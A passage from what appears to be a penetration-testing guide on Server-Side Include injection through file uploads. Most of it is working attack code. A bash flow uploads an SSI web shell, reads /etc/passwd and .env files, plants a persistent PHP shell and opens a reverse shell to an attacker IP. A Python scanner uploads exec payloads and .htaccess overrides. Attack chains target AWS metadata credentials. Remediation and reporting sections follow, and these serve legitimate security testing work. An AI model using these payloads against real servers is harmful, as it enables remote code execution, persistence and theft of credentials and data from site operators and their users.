  echo "[*] Check ${COLLAB} for 'ssi-verify' DNS callback"

  # ── Method 3: File write verification ──
  echo ""
  echo "─── File Write Verification ───"

  MARKER="SSI_PROOF_$(date +%s)"
  SSI_WRITE="<!--#exec cmd=\"echo ${MARKER} > /var/www/html/uploads/ssi_proof.txt\"-->"
  echo "$SSI_WRITE" > /tmp/ssi_write.shtml

  curl -s -X POST "https://target.com/api/upload" \
    -F "file=@/tmp/ssi_write.shtml;filename=writer.shtml" \
    -H "Cookie: session=TOKEN"

  for dir in uploads files; do
      curl -s "${TARGET}/${dir}/writer.shtml" --max-time 5 &>/dev/null
  done

  sleep 2

  PROOF=$(curl -s "${TARGET}/uploads/ssi_proof.txt" 2>/dev/null)
  if echo "$PROOF" | grep -q "$MARKER"; then
      echo "[!!!] SSI RCE CONFIRMED — file written successfully!"
  fi

  rm -f /tmp/ssi_oob.shtml /tmp/ssi_write.shtml
  ```
  :::

  :::tabs-item{icon="i-lucide-upload" label="Full Exploitation Flow"}
  ```bash
  TARGET="https://target.com"
  UPLOAD_URL="${TARGET}/api/upload"
  COOKIE="session=TOKEN"
  ATTACKER="10.10.14.1"

  echo "═══ SSI Full Exploitation ═══"

  # ── Step 1: Upload interactive SSI shell ──
  cat > /tmp/ssi_full_shell.shtml << 'SSIEOF'
  <html>
  <head><title>Document Viewer</title></head>
  <body>
  <!--#if expr="$QUERY_STRING"-->
  <pre><!--#exec cmd="$QUERY_STRING"--></pre>
  <!--#else-->
  <p>SSI Shell Active</p>
  <p>Usage: ?command</p>
  <!--#endif-->
  </body>
  </html>
  SSIEOF

  curl -s -X POST "$UPLOAD_URL" \
    -F "file=@/tmp/ssi_full_shell.shtml;filename=viewer.shtml;type=text/html" \
    -H "Cookie: $COOKIE"

  SHELL_URL="${TARGET}/uploads/viewer.shtml"

  echo "[*] Shell URL: ${SHELL_URL}"
  echo ""

  # ── Step 2: System enumeration ──
  echo "─── System Info ───"
  curl -s "${SHELL_URL}?id"
  curl -s "${SHELL_URL}?hostname"
  curl -s "${SHELL_URL}?uname%20-a"

  echo ""
  echo "─── Sensitive Files ───"
  curl -s "${SHELL_URL}?cat%20/etc/passwd" | head -5
  curl -s "${SHELL_URL}?cat%20/var/www/html/.env%202>/dev/null"

  echo ""
  echo "─── Network ───"
  curl -s "${SHELL_URL}?ip%20addr%20|%20grep%20inet"
  curl -s "${SHELL_URL}?ss%20-tlnp"

  # ── Step 3: Write persistent PHP shell ──
  echo ""
  echo "─── Deploying Persistent Shell ───"
  curl -s "${SHELL_URL}?echo%20'<?php%20system(\$_GET[\"cmd\"]);%20?>'%20>%20/var/www/html/uploads/p.php"

  sleep 1
  RESULT=$(curl -s "${TARGET}/uploads/p.php?cmd=id" 2>/dev/null)
  if echo "$RESULT" | grep -q "uid="; then
      echo "[!!!] Persistent PHP shell deployed: ${TARGET}/uploads/p.php?cmd=COMMAND"
  fi

  # ── Step 4: Reverse shell ──
  echo ""
  echo "─── Reverse Shell ───"
  echo "[*] Start listener: nc -lvnp 4444"
  curl -s "${SHELL_URL}?bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/${ATTACKER}/4444%200>%261'"

  rm -f /tmp/ssi_full_shell.shtml
  ```
  :::
::

---

## Comprehensive SSI Scanner

::code-collapse
```python [ssi_upload_scanner.py]
#!/usr/bin/env python3
"""
SSI Upload Scanner
Tests SSI extension acceptance, SSI processing,
and .htaccess-based SSI enablement
"""
import requests
import time
import sys
import urllib3
urllib3.disable_warnings()

class SSIScanner:
    SSI_EXTENSIONS = ['shtml', 'stm', 'shtm', 'html', 'htm', 'xhtml']
    SSI_CASE_VARIANTS = ['SHTML', 'Shtml', 'sHtml', 'STM', 'Stm', 'SHTM']
    UPLOAD_DIRS = ['uploads', 'files', 'media', 'content', 'static', '']

    ECHO_PAYLOAD = '<!--#echo var="SERVER_SOFTWARE"-->'
    EXEC_PAYLOAD = '<!--#exec cmd="echo SSI_RCE_CONFIRMED"-->'
    PRINTENV_PAYLOAD = '<!--#printenv-->'

    def __init__(self, upload_url, target=None, field="file", cookies=None, collab=None):
        self.upload_url = upload_url
        self.target = target or upload_url.rsplit('/', 2)[0]
        self.field = field
        self.collab = collab or "YOUR_COLLAB_ID.oastify.com"
        self.session = requests.Session()
        self.session.verify = False
        self.session.timeout = 15
        if cookies:
            self.session.cookies.update(cookies)
        self.results = {'accepted': [], 'echo_works': [], 'exec_works': [], 'htaccess': False}

    def upload(self, content, filename, ct='text/html'):
        files = {self.field: (filename, content.encode() if isinstance(content, str) else content, ct)}
        try:
            r = self.session.post(self.upload_url, files=files, timeout=15)
            ok = r.status_code in [200, 201] and not any(
                w in r.text.lower() for w in ['error', 'invalid', 'denied', 'blocked', 'forbidden']
            )
            return ok, r.status_code
        except:
            return False, 0

    def check_ssi_execution(self, filename):
        """Access uploaded file and check if SSI was processed"""
        for d in self.UPLOAD_DIRS:
            url = f"{self.target}/{d}/{filename}" if d else f"{self.target}/{filename}"
            try:
                r = self.session.get(url, timeout=5)
                if r.status_code == 200:
                    # Check exec
                    if 'SSI_RCE_CONFIRMED' in r.text:
                        return url, 'exec'
                    # Check echo (server info returned, directive consumed)
                    if any(s in r.text.lower() for s in ['apache', 'nginx', 'iis', 'litespeed']) \
                       and '<!--#echo' not in r.text:
                        return url, 'echo'
                    # Check if directives were consumed
                    if '<!--#' not in r.text and len(r.text.strip()) > 0:
                        return url, 'consumed'
            except:
                pass
        return None, None

    def scan(self, delay=0.3):
        print(f"\n{'='*60}")
        print(f" SSI Upload Scanner")
        print(f"{'='*60}")
        print(f"[*] Target: {self.target}")
        print(f"[*] Upload: {self.upload_url}")
        print("-" * 60)

        # Phase 1: Extension acceptance
        print("\n[*] Phase 1: SSI Extension Acceptance")
        all_exts = self.SSI_EXTENSIONS + self.SSI_CASE_VARIANTS

        for ext in all_exts:
            content = f'SSI_TEST_START\n{self.EXEC_PAYLOAD}\n{self.ECHO_PAYLOAD}\nSSI_TEST_END'
            ok, status = self.upload(content, f'ssi_test.{ext}')
            if ok:
                self.results['accepted'].append(ext)
                print(f"  [+] .{ext} ACCEPTED")

                # Check execution
                time.sleep(0.5)
                url, exec_type = self.check_ssi_execution(f'ssi_test.{ext}')
                if url:
                    if exec_type == 'exec':
                        self.results['exec_works'].append((ext, url))
                        print(f"      [!!!] SSI exec CONFIRMED at {url}")
                    elif exec_type == 'echo':
                        self.results['echo_works'].append((ext, url))
                        print(f"      [+] SSI echo works at {url}")
                    elif exec_type == 'consumed':
                        print(f"      [~] Directives consumed at {url} (may be processing)")

            time.sleep(delay)

        # Phase 2: Double extensions
        print("\n[*] Phase 2: Double Extensions")
        for combo in ['shtml.jpg', 'shtml.txt', 'shtml.png', 'html.jpg']:
            content = self.EXEC_PAYLOAD
            ok, status = self.upload(content, f'test.{combo}')
            if ok:
                self.results['accepted'].append(combo)
                print(f"  [+] .{combo} ACCEPTED")
                time.sleep(0.5)
                url, exec_type = self.check_ssi_execution(f'test.{combo}')
                if url and exec_type in ['exec', 'echo']:
                    print(f"      [!!!] SSI works via double extension!")
            time.sleep(delay)

        # Phase 3: .htaccess SSI enablement
        print("\n[*] Phase 3: .htaccess SSI Enablement")
        htaccess = 'Options +Includes\nAddHandler server-parsed .jpg .txt .html\nAddOutputFilter INCLUDES .jpg .txt .html'
        ok, status = self.upload(htaccess, '.htaccess', 'text/plain')
        if ok:
            self.results['htaccess'] = True
            print(f"  [+] .htaccess UPLOADED")

            # Upload SSI as .txt
            time.sleep(0.5)
            ok2, _ = self.upload(self.EXEC_PAYLOAD, 'ssi_via_htaccess.txt', 'text/plain')
            if ok2:
                time.sleep(1)
                url, exec_type = self.check_ssi_execution('ssi_via_htaccess.txt')
                if url and exec_type:
                    print(f"      [!!!] .htaccess chain works: SSI in .txt executed at {url}")
                    self.results['exec_works'].append(('.txt via .htaccess', url))

            # Upload SSI as .jpg
            ok3, _ = self.upload(self.EXEC_PAYLOAD, 'ssi_via_htaccess.jpg', 'image/jpeg')
            if ok3:
                time.sleep(1)
                url, exec_type = self.check_ssi_execution('ssi_via_htaccess.jpg')
                if url and exec_type:
                    print(f"      [!!!] .htaccess chain works: SSI in .jpg executed at {url}")
                    self.results['exec_works'].append(('.jpg via .htaccess', url))

        # Phase 4: OOB detection
        print(f"\n[*] Phase 4: OOB Detection (check {self.collab})")
        oob_payload = f'<!--#exec cmd="nslookup ssi-scan.{self.collab}"-->'
        for ext in ['shtml', 'html', 'txt']:
            ok, _ = self.upload(oob_payload, f'oob.{ext}')
            if ok:
                time.sleep(0.5)
                for d in self.UPLOAD_DIRS:
                    url = f"{self.target}/{d}/oob.{ext}" if d else f"{self.target}/oob.{ext}"
                    try:
                        self.session.get(url, timeout=3)
                    except:
                        pass
                print(f"  [?] OOB .{ext} sent — check collaborator")

        # Summary
        print(f"\n{'='*60}")
        print(f" RESULTS")
        print(f"{'='*60}")
        print(f"Extensions accepted: {len(self.results['accepted'])}")
        print(f"SSI echo confirmed:  {len(self.results['echo_works'])}")
        print(f"SSI exec confirmed:  {len(self.results['exec_works'])}")
        print(f".htaccess chain:     {'Yes' if self.results['htaccess'] else 'No'}")

        if self.results['exec_works']:
            print(f"\n[!!!] SSI RCE Confirmed:")
            for ext, url in self.results['exec_works']:
                print(f"    ★ .{ext} → {url}")

        return self.results


if __name__ == "__main__":
    scanner = SSIScanner(
        upload_url="https://target.com/api/upload",
        target="https://target.com",
        field="file",
        cookies={"session": "AUTH_TOKEN"},
        collab="YOUR_COLLAB_ID.oastify.com",
    )
    scanner.scan(delay=0.5)
```
::

---

## Exploitation Chains

::card-group
  :::card
  ---
  icon: i-lucide-link
  title: .shtml Upload → Direct SSI Execution → RCE
  ---
  1. Blacklist doesn't block `.shtml` extension
  2. Upload file containing `<!--#exec cmd="id"-->`
  3. Access uploaded `.shtml` file via browser
  4. Apache processes SSI directives and executes command
  5. Command output returned in HTTP response
  :::

  :::card
  ---
  icon: i-lucide-link
  title: .htaccess Upload → Enable SSI → Image Shell → RCE
  ---
  1. Upload `.htaccess` with `Options +Includes` and `AddHandler server-parsed .jpg`
  2. Upload image file containing SSI directives
  3. Apache now processes `.jpg` files through SSI handler
  4. Access the image file → SSI directives execute
  5. RCE through a valid image file
  :::

  :::card
  ---
  icon: i-lucide-link
  title: HTML Upload → Hidden SSI → Persistent RCE
  ---
  1. Application allows HTML file uploads (reports, documents)
  2. Upload HTML with SSI directives hidden in `display:none` div
  3. SSI directives invisible in rendered page but executed server-side
  4. Commands run every time the page is accessed
  5. Write PHP webshell for persistent access
  :::

  :::card
  ---
  icon: i-lucide-link
  title: SSI echo → Server Info → Environment Dump
  ---
  1. `#exec cmd` is disabled but `#echo var` is allowed
  2. Upload file with `<!--#printenv-->` directive
  3. Server dumps all environment variables
  4. Variables contain: paths, API keys, database strings, internal IPs
  5. Information disclosure leads to further exploitation
  :::

  :::card
  ---
  icon: i-lucide-link
  title: SSI include → Internal File Read → SSRF
  ---
  1. `#exec` disabled but `#include virtual` works
  2. Upload: `<!--#include virtual="http://169.254.169.254/latest/meta-data/"-->`
  3. Server-side request to AWS metadata endpoint
  4. IAM credentials included in response
  5. AWS account takeover via stolen credentials
  :::

  :::card
  ---
  icon: i-lucide-link
  title: SVG Upload → SSI in XML → RCE
  ---
  1. SVG files are XML — SSI comments are valid XML comments
  2. Upload SVG with `<!--#exec cmd="id"-->` in text element
  3. If server processes SVG through SSI handler (via .htaccess or config)
  4. SSI directives in SVG execute server-side
  5. RCE through an "image" upload
  :::
::

---

## Reporting & Remediation

### Report Structure

::steps{level="4"}

#### Title
`Remote Code Execution via Server-Side Include (SSI) Injection in File Upload at [Endpoint]`

#### Root Cause
The application accepts file uploads with SSI-processed extensions (`.shtml`, `.stm`) and the web server has SSI processing enabled (`Options +Includes` on Apache / `ssi on` on Nginx). When uploaded files are accessed, the web server processes SSI directives including `<!--#exec cmd="...">` which executes arbitrary operating system commands.

#### Reproduction
```bash
# 1. Create SSI webshell
echo '<!--#exec cmd="id"-->' > shell.shtml

# 2. Upload
curl -X POST "https://target.com/api/upload" \
  -F "file=@shell.shtml;filename=report.shtml;type=text/html" \
  -H "Cookie: session=TOKEN"

# 3. Access → SSI executes
curl "https://target.com/uploads/report.shtml"
# Output: uid=33(www-data) gid=33(www-data)
```

#### Impact
Full Remote Code Execution as the web server user. The attacker can execute arbitrary OS commands, read sensitive files, establish reverse shells, and pivot to internal networks. SSI execution occurs at the web server level, bypassing application-layer security controls.

::

### Remediation

::card-group
  :::card
  ---
  icon: i-lucide-shield-check
  title: Disable SSI Globally
  ---
  Unless SSI is specifically required, disable it entirely:

  **Apache:** Remove `Options +Includes` and `AddHandler server-parsed` from all configs. Set `Options -Includes` globally.

  **Nginx:** Remove `ssi on;` from all location blocks.

  **IIS:** Disable SSI in Server Manager → Features.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Disable exec Directive
  ---
  If SSI must be used for `#include` or `#echo`, disable command execution specifically:

  **Apache:** Use `Options +IncludesNOEXEC` instead of `Options +Includes`

  **Nginx:** Set `ssi on;` but don't enable exec (Nginx doesn't support `#exec` by default)
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Block SSI Extensions in Uploads
  ---
  Add `.shtml`, `.stm`, `.shtm` to the upload extension blacklist (or better, use a whitelist). Also block `.htaccess` to prevent SSI enablement via config override.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Disable SSI for Upload Directories
  ---
  Even if SSI is needed elsewhere, explicitly disable it for directories where user content is stored:
  ```apache
  <Directory /var/www/html/uploads>
      Options -Includes -ExecCGI
  </Directory>
  ```
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Disable AllowOverride for Uploads
  ---
  Prevent `.htaccess` from enabling SSI in upload directories:
  ```apache
  <Directory /var/www/html/uploads>
      AllowOverride None
  </Directory>
  ```
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Serve Uploads from Separate Domain
  ---
  Serve user uploads from a static-file-only domain with no SSI, PHP, or CGI support. Configure the server for that domain to serve only static content with no server-side processing.
  :::
::

---

## References & Resources

::card-group
  :::card
  ---
  icon: i-lucide-external-link
  title: Apache SSI Documentation
  to: https://httpd.apache.org/docs/2.4/howto/ssi.html
  target: _blank
  ---
  Official Apache documentation for Server-Side Includes — covers directives, configuration, and security considerations.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: OWASP — Server-Side Includes Injection
  to: https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection
  target: _blank
  ---
  OWASP reference for SSI injection attacks covering detection, exploitation, and prevention techniques.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: CWE-97 — Improper Neutralization of SSI
  to: https://cwe.mitre.org/data/definitions/97.html
  target: _blank
  ---
  MITRE CWE entry specifically covering Server-Side Include injection vulnerabilities and their remediation.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: HackTricks — SSI Injection
  to: https://book.hacktricks.wiki/en/pentesting-web/server-side-inclusion-edge-side-inclusion-injection.html
  target: _blank
  ---
  Comprehensive SSI exploitation guide covering directives, detection, file upload chains, and bypass techniques.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: PayloadsAllTheThings — SSI Injection
  to: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Include%20Injection
  target: _blank
  ---
  Community payload repository with SSI injection payloads for detection, RCE, file inclusion, and information disclosure.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: Nginx SSI Module
  to: https://nginx.org/en/docs/http/ngx_http_ssi_module.html
  target: _blank
  ---
  Nginx documentation for the SSI module — configuration, supported directives, and security settings.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: PortSwigger — Server-Side Template Injection
  to: https://portswigger.net/web-security/server-side-template-injection
  target: _blank
  ---
  While focused on SSTI, covers related server-side processing vulnerabilities including SSI-like directive injection.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: HackerOne — SSI Disclosed Reports
  to: https://hackerone.com/hacktivity?querystring=server%20side%20include
  target: _blank
  ---
  Real-world disclosed bug bounty reports demonstrating SSI injection via file upload on production applications.
  :::
::